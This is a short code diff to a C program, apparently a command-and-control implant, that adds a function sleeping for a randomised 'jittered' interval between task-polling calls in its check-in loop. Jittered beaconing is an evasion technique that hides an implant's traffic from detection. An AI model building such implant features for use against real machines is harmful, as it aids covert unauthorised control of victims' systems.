@@ -94,13 +94,21 @@ void get_tasks(){
 
 return;
 }
+
+bool sleep_with_jitter(int interval, int jitter){
+    int variation = (interval * jitter)/100;
+    int sleep = (interval - variation) + rand()%(2*variation+1);
+        Sleep(sleep * 1000);
+
+return 0;
+}
 int main(){
 	char json_buff[512];
 	checkin();
 //main loop
     for(;;){
         get_tasks();
-
+        sleep_with_jitter(config.interval,config.jitter);
     }
 
 	return 0;
